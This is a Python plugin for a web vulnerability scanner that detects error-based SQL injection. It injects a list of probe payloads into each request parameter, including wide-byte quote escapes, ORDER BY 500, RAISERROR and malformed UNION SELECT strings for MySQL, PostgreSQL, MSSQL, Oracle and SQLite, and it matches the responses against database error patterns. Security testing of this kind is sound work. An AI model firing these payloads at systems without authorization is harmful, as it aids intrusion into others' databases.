#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2020/5/10
# JiuZero 2025/3/13

from data.rule.SQLiErrors import rules
from api import generateResponse, random_num, random_str, VulType, Type, PluginBase, conf, logger
from lib.helper.helper_sensitive import sensitive_page_error_message_check
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

class Z0SCAN(PluginBase):
    name = "SQLiError"
    desc = 'SQL Error Finder'

    def condition(self):
        if not self.response.waf and 1 in conf.level:
            return True
        return False
        
    def audit(self):
        if self.condition():
            _payloads = [
                ## 宽字节
                r'鎈\'"\(',
                ## 通用报错
                r';)\\\'\\"',
                r'\' oRdeR bY 500 ',
                r';`)',
                r'\\', 
                r"%%2727", 
                r"%25%27", 
                r"%60", 
                r"%5C",
                ## 强制报错
                # MySQL
                r'\' AND 0xG1#',
                # PostgreSQL  
                r"' AND 'a' ~ 'b\[' -- ",
                # MSSQL
                r"; RAISERROR('Error generated', 16, 1) -- ", 
                # Oracle
                r"' UNION SELECT XMLType('<invalid><xml>') FROM dual -- ",  
                # SQLite
                r"' UNION SELECT SUBSTR('o', -1, 1) -- ",
            ]
    
            iterdatas = self.generateItemdatas()
            with ThreadPoolExecutor(max_workers=None) as executor:
                futures = [
                    executor.submit(self.process, _, _payloads) for _ in iterdatas
                ]
                try:
                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception as task_e:
                            logger.error(f"Task failed: {task_e}", origin="SQLiError")
                except KeyboardInterrupt:
                    executor.shutdown(wait=False)
                except Exception as e:
                    logger.error(f"Unexpected error: {e}", origin="SQLiError")
                    executor.shutdown(wait=False)
    
    def Get_sql_errors(self):
        sql_errors = []
        for database, re_strings in rules.items():
            for re_string in re_strings:
                sql_errors.append((re.compile(re_string, re.IGNORECASE), database))
        return sql_errors
    
    def process(self, _, _payloads):
        k, v, position = _
        for _payload in _payloads:
            payload = self.insertPayload(k, v, position, _payload)
            r = self.req(position, payload)
            if not r:
                continue
            html = r.text
            for sql_regex, dbms_type in self.Get_sql_errors():
                match = sql_regex.search(html)
                if match:
                    result = self.new_result()
                    result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.SQLI, position, param=k, payload=payload, msg="DBMS_TYPE Maybe {}; Match {}".format(dbms_type, match.group()))
                    result.add_detail("Request", r.reqinfo, generateResponse(r), "Dbms Maybe {}; Match {}".format(dbms_type, match.group()))
                    self.success(result)
                    return True
            message_lists = sensitive_page_error_message_check(html)
            if message_lists:
                result = self.new_result()
                result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.SQLI, position, param=k, payload=payload, msg="Receive The Error Msg {}".format(repr(message_lists)))
                result.add_detail("Request", r.reqinfo, generateResponse(r), "Receive Error Msg {}".format(repr(message_lists)))
                self.success(result)
                break
    